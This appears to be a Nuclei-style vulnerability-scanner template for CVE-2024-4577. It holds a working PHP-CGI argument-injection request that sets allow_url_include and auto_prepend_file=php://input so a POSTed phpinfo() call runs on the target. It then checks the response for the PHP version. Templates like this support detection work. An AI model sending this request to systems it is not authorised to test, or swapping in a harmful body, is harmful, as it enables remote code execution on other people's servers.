id: CVE-2024-4577

info:
  name: CVE-2024-4577 - PHP allow_url_include RCE via auto_prepend_file
  author: Abu Hurayra
  severity: high
  description: |
    This template checks for remote code execution vulnerability in systems allowing `allow_url_include` and `auto_prepend_file` via crafted input. If vulnerable, the server may execute the payload leading to RCE.
  reference:
    - https://example.com/cve/CVE-2024-4577
  tags: rce,php,allow_url_include

requests:
  - method: POST
    path:
      - "{{BaseURL}}/test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input"

    headers:
      User-Agent: "curl/8.3.0"
      Accept: "*/*"
      Content-Type: "application/x-www-form-urlencoded"

    body: |
      <?php phpinfo(); ?>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Version"
        part: body

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "PHP Version ([0-9.]+)"

